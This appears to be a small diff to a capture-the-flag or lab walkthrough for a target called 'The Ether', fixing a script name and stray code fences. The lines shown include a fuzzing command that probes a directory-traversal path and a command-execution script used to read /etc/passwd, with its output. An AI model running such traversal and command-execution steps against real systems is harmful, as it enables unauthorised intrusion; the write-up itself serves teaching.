@@ -187,7 +187,7 @@ for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
 Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
-# ./brute.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
+# ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
 ...
 [+] Trying ../../theeTHER.CoM/public_html/about.php
 [+] Trying ../../theeTHER.COm/public_html/about.php
@@ -284,8 +284,6 @@ Let's give it a shot.
 
 ```
 # ./cmd.sh -e "cat /etc/passwd"
-```
-```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
